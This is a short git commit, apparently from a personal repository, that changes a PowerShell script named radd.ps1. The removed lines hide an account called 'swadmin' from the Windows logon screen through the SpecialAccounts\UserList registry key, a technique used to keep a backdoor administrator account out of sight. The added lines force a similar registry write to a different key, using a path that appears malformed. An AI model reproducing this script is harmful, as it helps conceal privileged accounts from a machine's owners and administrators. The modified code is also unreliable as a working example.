cf8cec76e40e89f901d9911404a612d388b598f2
tobiasasa <tobias.asa@hotmail.com>
2022-09-22 15:35:57 -0700

    asd123

--- resources/radd.ps1
+++ resources/radd.ps1
@@ -1,3 +1,3 @@
-$path1 = 'HKLM:\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
-New-item -Path $path1
-New-ItemProperty -Path $path1 -Name 'swadmin' -Value 00000000 -PropertyType DWord
+$path1 = '\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+New-item -Path $path1 -Force
+New-ItemProperty -Path $path1 -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
